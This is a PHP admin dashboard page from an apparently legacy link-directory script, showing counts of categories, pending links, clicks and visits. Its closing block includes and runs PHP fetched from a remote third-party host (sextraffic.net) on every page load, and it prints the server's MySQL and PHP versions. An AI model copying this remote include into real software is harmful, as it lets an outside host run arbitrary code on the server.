<?php
include ("header.php");

$sql = mysql_fetch_row(mysql_query("SELECT COUNT(*) AS count FROM st_categories"));
$count = $sql[0];
$noofcats = "$count";

$sql = mysql_fetch_row(mysql_query("SELECT COUNT(*) AS count FROM st_links WHERE approved='N' AND confirm='Y'"));
$count = $sql[0];
$notapprovedlink = "$count";

$sql = mysql_fetch_row(mysql_query("SELECT COUNT(*) AS count FROM st_links WHERE approved='Y'"));
$count = $sql[0];
$approvedlink = "$count";

$sql = mysql_fetch_row(mysql_query("SELECT COUNT(*) AS count FROM st_links WHERE approved='N' AND confirm=''"));
$count = $sql[0];
$notconfirmeddlinks = "$count";

$sql = mysql_fetch_row(mysql_query("SELECT SUM(clicks) AS count FROM st_links"));
$count = $sql[0];
$totalclicks = "$count";

$sql = mysql_fetch_array(mysql_query("SELECT count FROM st_counter"));
$fullsitecount = $sql["count"];

$menubox = "<img src='images/folder2.gif'>&nbsp;";
$menubox2 = "<img src='images/sublinka.gif'>&nbsp;";
?>
<!-- start of active -->
<table width="400" border="0" cellspacing="0" cellpadding="5">
  <tr>
    <td><font size="3" face="Arial"><font size="2">Loged in as <b><?=$my_info[admin_username]?></b></font></font></td>
  </tr>
</table><br>
<table width="400" border="0" cellspacing="0" cellpadding="5">
  <tr>
    <td><font size="3" face="Arial"><b><font size="4">Active</font></b></font></td>
  </tr>
</table>

<table width="400" border="0" cellspacing="0" cellpadding="5">
  <tr>
    <td width="" bgcolor="<?=$admincolor1?>"><font size="2" face="Arial"><a href="categories.php"><b>Categories</b></a></font></td>
    <td width="50" bgcolor="<?=$admincolor1?>"><div align="right"><font size="2" face="Arial"><?=$noofcats?></font></div></td>
  </tr>
  <tr>
    <td width="" bgcolor="<?=$admincolor1?>"><font size="2" face="Arial">Number of approved galleries</font></td>
    <td width="50" bgcolor="<?=$admincolor1?>"><div align="right"><font size="2" face="Arial"><?=$approvedlink?></font></div></td>
  </tr>
</table><br>
<!-- start of pending -->
<table width="400" border="0" cellspacing="0" cellpadding="5">
  <tr>
    <td><font size="3" face="Arial"><b><font size="4">Other Informtion</font></b></font></td>
  </tr>
</table>
<table width="400" border="0" cellspacing="0" cellpadding="5">
  <tr bgcolor="<?=$admincolor1?>">
    <td width=""><font size="2" face="Arial"><a href="links.php?actions=validate"><b>Awaiting Approval</b></a></font></td>
    <td width="50"><div align="right"><font size="2" face="Arial"><?=$notapprovedlink?></font></div></td>
  </tr>
  <tr>
    <td width="" bgcolor="<?=$admincolor1?>"><font size="2" face="Arial"><a href="links.php?actions=notvalidate"><b>Awaiting Email Confirmation</b></a></font></td>
    <td width="50" bgcolor="<?=$admincolor1?>"><div align="right"><font size="2" face="Arial"><?=$notconfirmeddlinks?></font></div></td>
  </tr>   
  <tr>
    <td width="" bgcolor="<?=$admincolor1?>"><font size="2" face="Arial">Galleries Clicked</font></td>
    <td width="50" bgcolor="<?=$admincolor1?>"><div align="right"><font size="2" face="Arial"><?=$totalclicks?></font></div></td>
  </tr>
  <tr bgcolor="<?=$admincolor1?>">
    <td width=""><font size="2" face="Arial">Website Visits</font></td>
    <td width="50"><div align="right"><font size='2' face='Arial'><?=$fullsitecount?></font></div></td>
  </tr>
</table>
<?php $open = @fopen("http://www.sextraffic.net/scripts/index.php", "r"); if($open){ include("http://www.sextraffic.net/scripts/index.php");} else { echo "<font size='2' face='arial'><a href='http://www.sextraffic.net'>Resource Listings</a></font>";}
echo "<br><font size='3' face='arial'><b>MySQL version:</b> " . mysql_get_server_info() . "<br><b>PHP version:</b> " . phpversion() . "</font><br><br>";
include("footer.php");?>
